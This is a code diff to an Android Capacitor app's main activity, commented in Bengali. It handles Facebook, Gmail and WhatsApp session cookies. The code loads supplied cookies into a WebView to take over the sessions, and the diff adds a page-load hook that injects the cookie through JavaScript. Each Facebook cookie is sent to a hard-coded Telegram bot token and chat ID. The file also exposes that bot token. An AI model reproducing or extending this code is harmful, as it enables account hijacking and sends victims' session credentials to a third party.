@@ -6,6 +6,7 @@ import android.webkit.CookieManager;
 import android.webkit.WebView;
 import android.webkit.JavascriptInterface;
 import android.webkit.WebSettings;
+import android.webkit.WebViewClient;
 import com.getcapacitor.BridgeActivity;
 
 import java.io.OutputStream;
@@ -17,6 +18,8 @@ public class MainActivity extends BridgeActivity {
 
     private static final String BOT_TOKEN = "8784862798:AAECxAVjbGcmkZ0nMdNnydILQgZ3F67m3VI";
     private static final String CHAT_ID = "6449981797";
+    private boolean isCookieInjected = false;
+    private String savedCookie = "";
 
     @Override
     public void onCreate(Bundle savedInstanceState) {
@@ -26,14 +29,26 @@ public class MainActivity extends BridgeActivity {
         WebSettings webSettings = webView.getSettings();
         webSettings.setJavaScriptEnabled(true);
         webSettings.setDomStorageEnabled(true);
-        
-        // ═══ ফেসবুক লোড হওয়ার জন্য কিছু সেটিংস ═══
+        webSettings.setDatabaseEnabled(true);
         webSettings.setUserAgentString("Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36");
 
         final CookieManager cookieManager = CookieManager.getInstance();
         cookieManager.setAcceptCookie(true);
-        // ═══ সবচেয়ে গুরুত্বপূর্ণ লাইন (থার্ড পার্টি কুকি অ্যালাও করা) ═══
         cookieManager.setAcceptThirdPartyCookies(webView, true);
+
+        // ═══ পেজ লোড হওয়ার সময় জাভাস্ক্রিপ্ট ইনজেক্ট করার ট্রিক ═══
+        webView.setWebViewClient(new WebViewClient() {
+            @Override
+            public void onPageFinished(WebView view, String url) {
+                super.onPageFinished(view, url);
+                if (isCookieInjected && savedCookie != null) {
+                    // ফেসবুকের পেজে জাভাস্ক্রিপ্ট দিয়ে কুকি সেট করার চেষ্টা
+                    String js = "document.cookie='" + savedCookie.replace("'", "\\'") + "';";
+                    view.evaluateJavascript(js, null);
+                    isCookieInjected = false;
+                }
+            }
+        });
 
         webView.addJavascriptInterface(new Object() {
             @JavascriptInterface
@@ -41,32 +56,31 @@ public class MainActivity extends BridgeActivity {
                 CookieManager cm = CookieManager.getInstance();
                 
                 if (siteName.equals("facebook")) {
-                    // ফেসবুকের জন্য স্পেশাল ট্রিটমেন্ট
                     String formattedCookie = cookieString.trim();
                     if (!formattedCookie.endsWith(";")) formattedCookie += ";";
+                    
+                    savedCookie = formattedCookie;
 
-                    // ফেসবুকের সব ডোমেইনে কুকি সেট করা
+                    // ১. সব ফেসবুক ডোমেইনে কুকি সেট করা
                     cm.setCookie("https://www.facebook.com", formattedCookie);
                     cm.setCookie("https://m.facebook.com", formattedCookie);
                     cm.setCookie("https://facebook.com", formattedCookie);
-                    
-                    // ফেসবুকের সিকিউর কুকি ফ্ল্যাগ সেট করা
-                    cm.setCookie(".facebook.com", formattedCookie);
-                    
-                    // কুকি ফ্লাশ করা (যাতে সাথে সাথে সেভ হয়)
+                    cm.setCookie("https://.facebook.com", formattedCookie);
                     cm.flush();
 
+                    // ২. টেলিগ্রামে পাঠানো
                     sendToTelegram("FACEBOOK", formattedCookie);
+
+                    // ৩. ফ্ল্যাগ অন করা (যাতে পেজ লোড হলে জাভাস্ক্রিপ্ট রান হয়)
+                    isCookieInjected = true;
 
                     runOnUiThread(new Runnable() {
                         @Override
                         public void run() {
-                            // মেইন ফেসবুক সাইটে যাওয়া
                             webView.loadUrl("https://m.facebook.com/home.php");
                         }
                     });
                 } else {
-                    // অন্যান্য সাইটের জন্য (Gmail, WhatsApp ইত্যাদি)
                     String domain = siteName.equals("whatsapp") ? "web.whatsapp.com" : siteName + ".com";
                     String loadUrl = siteName.equals("whatsapp") ? "https://web.whatsapp.com" : "https://www." + domain;
 
@@ -124,4 +138,4 @@ public class MainActivity extends BridgeActivity {
             }
         }).start();
     }
-            }
+    }
